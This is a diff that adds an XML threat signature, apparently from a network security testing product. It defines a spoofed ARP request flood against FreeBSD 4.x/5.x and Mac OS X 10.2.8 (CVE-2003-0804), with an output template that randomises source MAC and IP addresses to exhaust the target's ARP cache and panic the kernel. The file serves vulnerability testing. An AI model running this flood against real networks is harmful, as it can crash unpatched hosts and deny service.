@@ -1,0 +1,71 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="BSD Spoofed ARP Flood"/>
+    <EngDesc display="true" value="This threat floods a FreeBSD system with spoofed ARP requests, causing resource starvation which can results in a system panic. From the FreeBSD advisory FreeBSD-SA-03:14.arp: Normally, when a FreeBSD system receives an ARP request for a network address configured on one of its interfaces from a system on a local network, it adds a reciprocal ARP entry to the cache for the system from where the request originated. Expiry timers are used to purge unused entries from the ARP cache. A reference count is maintained for each ARP entry. If the reciprocal ARP entry is not in use by an upper layer protocol, the reference count will be zero."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+      <item value="Implementation_Exploitation"/>
+      <item value="Resource_Exhaustion"/>
+      <item value="Flood"/>
+    </Intent>
+    <Protocol display="true" value="ARP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Protocol"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+      <item value="FreeBSD"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true">
+      <item value="FreeBSD_4.*"/>
+      <item value="FreeBSD_5.*"/>
+      <item value="Mac_OS_X_10.2.8"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0804"/>
+    <CVEID display="true" value="CVE-2003-0804"/>
+    <bugtraqID display="true" value="8689"/>
+    <OSVDB display="true" value="2599"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464dadb000a900fe009b00c965e7f03a"/>
+    <Revision display="true" value="9"/>
+    <Safe display="true" value=""/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725919297500000"/>
+    <SigStyle display="false" value="Flood"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="ARP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1139461731" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+  </Loops>
+  <Output index="A" Count="1">
+    <Ethernet srcMac="@random(00:00:00:00:00:00, FF:FF:FF:FF:FF:FF)" destMac="$destMAC" pktType="0806">
+      <ARP hwAddrType="1" protoAddrType="0800" hwAddrSize="6" protoAddrSize="4" op="1" srcMac="$sourceMAC" srcIP="@random(0.0.0.0, 255.255.255.255)" destMac="$destMAC" destIP="$destIP"/>
+    </Ethernet>
+  </Output>
+</threatSignature>
